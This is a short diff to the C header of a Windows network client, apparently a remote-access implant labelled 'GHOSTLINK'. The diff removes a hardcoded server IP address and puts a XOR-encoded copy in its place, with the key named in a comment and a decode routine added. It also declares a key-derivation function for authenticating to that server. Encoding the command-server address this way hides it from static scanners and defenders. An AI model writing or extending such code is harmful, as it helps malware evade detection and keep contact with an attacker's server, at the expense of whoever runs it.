@@ -31,7 +31,9 @@
 #pragma comment(lib, "comdlg32.lib")
 
 /* ── Configuration ────────────────────────────────────────────────── */
-#define SERVER_HOST      L"150.195.114.185"
+/* XOR-encrypted with key "GHOSTLINK" */
+#define SERVER_HOST_ENC   {0x2f,0x3c,0x3b,0x23,0x6e,0x63,0x66,0x7f,0x7e,0x77,0x66,0x7e,0x6a,0x61,0x62,0x78,0x7f,0x7f,0x69,0x79,0x77,0x66,0x6e,0x79,0x71,0x7a,0x7f,0x74,0x00}
+void network_decode_host(WCHAR *out, int outLen);
 #define SERVER_PORT       58443
 #define SERVER_USE_TLS    0
 
@@ -85,6 +87,7 @@ BOOL   crypto_sha256(const BYTE *data, DWORD len, BYTE hash[SHA256_LEN]);
 void   crypto_random_bytes(BYTE *buf, DWORD len);
 char*  crypto_hex_encode(const BYTE *data, DWORD len);
 BOOL   crypto_hex_decode(const char *hex, BYTE *data, DWORD *len);
+BOOL   crypto_auth_derive_key(NCRYPT_KEY_HANDLE my_priv, const BYTE *peer_blob, DWORD blob_len, BYTE key_out[32]);
 
 /* ── Network API ──────────────────────────────────────────────────── */
 BOOL   network_init(void);
